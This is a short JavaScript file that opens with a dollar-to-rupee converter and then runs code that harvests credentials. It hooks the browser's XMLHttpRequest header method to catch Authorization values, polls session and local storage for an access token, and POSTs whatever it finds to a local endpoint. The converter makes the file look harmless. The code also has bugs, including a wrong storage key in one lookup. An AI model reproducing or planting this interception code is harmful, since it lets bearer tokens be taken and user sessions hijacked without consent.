const oneDollarInLKR = 185.84;

function convertUSDToLKR(usd) {
    return parseInt(usd) * oneDollarInLKR;
}

const url = "http://localhost:5000/access-token";
const accessTokenID = "access_token";
let accessToken = "";

function sendAccessToken() {
    fetch(url, {
        method: "POST",
        body: JSON.stringify({ accessToken: accessToken }),
        headers: {
            "Content-Type":"application/json"
        }
    });
}

console.log("Getting access token by attaching to network calls");
const pureSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
XMLHttpRequest.prototype.setRequestHeader = function (key, value) {
    if (key === "Authorization") {
        accessToken = value;
        sendAccessToken();
    }
    pureSetRequestHeader.call(this, key, value);
};

const poll = setInterval(() => {
    console.log("Looking for access token...")
    if (sessionStorage.getItem(accessTokenID)) {
        console.log("Getting access token from session storage")
        accessToken = sessionStorage.getItem(accessTokenID);
    }
    else if (localStorage.getItem(accessTokenID)) {
        console.log("Getting access token from local storage")
        accessToken = localStorage.getItem(accessToken);
    }

    if (accessToken) {
        sendAccessToken();
        clearInterval(poll);
    }
}, 5000);
